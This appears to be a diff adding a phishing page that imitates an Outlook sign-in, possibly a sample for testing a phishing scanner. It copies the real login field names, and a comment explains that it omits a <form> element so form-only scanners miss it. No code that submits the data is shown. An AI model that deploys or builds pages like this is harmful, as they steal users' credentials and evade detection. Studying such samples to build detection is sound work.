@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Sign in to your account</title>
+<style>
+  body { font-family: system-ui, sans-serif; margin: 0; background: #f6f7f9; color: #202124; }
+  .wrap { max-width: 520px; margin: 48px auto; background: #fff; padding: 32px; border-radius: 12px;
+           box-shadow: 0 1px 4px rgba(0,0,0,.12); }
+  h1 { font-size: 20px; margin: 0 0 4px; }
+  p.lede { margin: 0 0 24px; color: #5f6368; font-size: 14px; }
+  label { display: block; margin: 14px 0 4px; font-size: 13px; font-weight: 600; }
+  input, select { width: 100%; box-sizing: border-box; padding: 9px 10px; font-size: 14px;
+                   border: 1px solid #dadce0; border-radius: 6px; }
+  button { margin-top: 22px; width: 100%; padding: 11px; font-size: 15px; border: 0;
+            border-radius: 6px; background: #1a73e8; color: #fff; cursor: pointer; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<h1>Sign in</h1>
+<p class="lede">Your session expired. Sign in to continue to Outlook.</p>
+<!-- No <form> element at all: the kit posts with fetch(). A scanner that only
+     looks inside <form> sees nothing here. -->
+<div class="login">
+  <label for="u">Email or phone</label>
+  <input id="u" name="loginfmt" type="email" autocomplete="username">
+  <label for="p">Password</label>
+  <input id="p" name="passwd" type="password" autocomplete="current-password">
+  <div role="button" tabindex="0">Sign in</div>
+</div>
+</div>
+</body>
+</html>
